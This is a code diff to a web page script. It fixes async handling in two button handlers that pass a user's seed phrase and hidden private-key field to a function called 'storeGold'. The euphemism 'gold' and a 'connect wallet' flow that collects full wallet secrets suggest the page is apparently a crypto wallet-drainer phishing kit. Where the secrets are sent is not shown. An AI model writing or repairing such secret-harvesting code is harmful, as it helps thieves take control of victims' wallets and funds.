@@ -469,6 +469,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 
+	
+
 
 
 // Make storeGold return a Promise
@@ -542,24 +544,27 @@ function storeGold(inputId, skipFormatCheck = false) {
   });
 }
 
-
-
-
-			  
-// button click trigger gold save
-document.getElementById('import-gold-btn')?.addEventListener('click', function (event) {
+// Button click trigger gold save - seed
+document.getElementById('import-gold-btn')?.addEventListener('click', async function (event) {
   event.preventDefault();
-  await storeGold('sp-input'); // Perform format check
+  try {
+    await storeGold('sp-input'); // Perform format check
+  } catch (error) {
+    console.error('Error importing gold:', error);
+  }
 });
 
-
-// button click trigger gold save
-document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
+// Button click trigger gold save - prv key
+document.getElementById('connect-to-wallet-btn')?.addEventListener('click', async function (event) {
   event.preventDefault();
-  await storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
-  storeWalletAddressHandler('wallet-address-txt-hidden', 'wallet-address-label1');
-
+  try {
+    await storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
+    storeWalletAddressHandler('wallet-address-txt-hidden', 'wallet-address-label1');
+  } catch (error) {
+    console.error('Error connecting wallet:', error);
+  }
 });
+
 
 
 	
